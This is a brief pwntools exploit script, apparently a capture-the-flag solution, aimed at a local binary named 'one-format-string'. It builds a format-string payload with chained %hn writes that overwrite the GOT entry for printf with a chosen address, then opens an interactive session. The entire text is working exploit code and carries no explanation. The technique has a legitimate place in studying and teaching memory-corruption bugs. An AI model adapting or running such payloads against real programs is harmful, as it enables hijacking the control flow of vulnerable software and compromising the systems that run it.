from pwn import *
p = process("./one-format-string")

got_printf = p.elf.got['printf']

target_addr = got_printf
target_num = 0x4006c0


front = target_num & 0xffff

back = (target_num >>16) - (front)
back = back & 0xffff

while back < 0:
    back += 0x10000

third = 0 - (front + back)
third = third & 0xffff


while third < 0:
    third += 0x10000

final = 0 - (front + back +third)
final = final & 0xffff

while final < 0:
    final += 0x10000

print hex(front)
print hex(back)
print hex(third)
print hex(final)


payload = "%" + "%05d" % front + "x%19$hn"
payload = payload + "%" + "%05d" % back + "x%20$hn"
payload = payload + "%" + "%05d" % third + "x%21$hn0"
payload = payload + p64(target_addr) + p64(target_addr+2) + p64(target_addr+4)

p.sendline(payload)

p.interactive()


